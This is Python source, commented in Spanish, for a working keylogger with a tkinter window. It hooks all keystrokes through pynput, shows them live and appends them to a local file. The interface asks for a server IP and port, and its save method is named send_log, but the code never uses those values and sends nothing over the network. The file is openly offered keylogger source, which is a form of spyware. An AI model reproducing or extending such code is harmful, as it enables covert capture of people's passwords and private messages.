
import tkinter as tk
from tkinter import messagebox, scrolledtext
import pynput.keyboard


class Keylogger:
    def __init__(self, server_ip, server_port):
        self.log = ""
        self.server_ip = server_ip
        self.server_port = server_port
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        """
        Maneja cada pulsación de tecla y actualiza el log.
        - Letras, números, etc.: se añaden tal cual.
        - Espacio: se añade ' '.
        - Backspace: borra el último carácter del log (si existe).
        - Enter: añade un salto de línea.
        - Otras teclas especiales: se ignoran para que no aparezcan en el texto.
        """
        try:
            # Teclas normales (letras, números, símbolos...)
            self.log += key.char
        except AttributeError:
            # Teclas especiales
            if key == pynput.keyboard.Key.space:
                self.log += " "
            elif key == pynput.keyboard.Key.backspace:
                # Borra el último carácter si hay algo escrito
                if self.log:
                    self.log = self.log[:-1]
            elif key == pynput.keyboard.Key.enter:
                self.log += "\n"
            else:
                # Ignoramos otras teclas especiales (Shift, Ctrl, Alt, etc.)
                pass

    def start(self):
        self.listener.start()

    def stop(self):
        self.listener.stop()

    def send_log(self):
        """Guarda el log en un archivo local."""
        try:
            with open("keylog.txt", "a", encoding="utf-8") as f:
                f.write(self.log + "\n")
            print("[INFO] Log guardado en 'keylog.txt'")
            self.log = ""  # Limpia el log después de guardar
        except Exception as e:
            print(f"[ERROR] No se pudo guardar: {e}")
class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger sencillo")

        self.server_ip_label = tk.Label(master, text="Server IP:")
        self.server_ip_label.pack()
        self.server_ip_entry = tk.Entry(master)
        self.server_ip_entry.pack()

        self.server_port_label = tk.Label(master, text="Server Port:")
        self.server_port_label.pack()
        self.server_port_entry = tk.Entry(master)
        self.server_port_entry.pack()

        self.start_button = tk.Button(master, text="Start keylogger", command=self.start_keylogger)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop y guardar log", command=self.stop_keylogger)
        self.stop_button.pack()

        self.log_text = scrolledtext.ScrolledText(master, width=50, height=20)
        self.log_text.pack()

        self.keylogger = None
        self.update_log()

    def start_keylogger(self):
        """Inicia el keylogger con la IP y puerto indicados en la interfaz."""
        server_ip = self.server_ip_entry.get()
        server_port_text = self.server_port_entry.get()

        if not server_ip or not server_port_text:
            messagebox.showerror("Error", "Rellena IP y puerto del servidor.")
            return

        try:
            server_port = int(server_port_text)
        except ValueError:
            messagebox.showerror("Error", "El puerto debe ser un número entero.")
            return

        self.keylogger = Keylogger(server_ip, server_port)
        self.keylogger.start()
        messagebox.showinfo("Info", "Keylogger iniciado.")

    def stop_keylogger(self):
        """Detiene el keylogger y guarda el log en el archivo."""
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger.send_log()
            messagebox.showinfo("Info", "Keylogger detenido y log guardado.")

    def update_log(self):
        """Refresca el cuadro de texto con el contenido actual del log."""
        if self.keylogger:
            self.log_text.delete(1.0, tk.END)
            self.log_text.insert(tk.END, self.keylogger.log)
        self.master.after(1000, self.update_log)


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()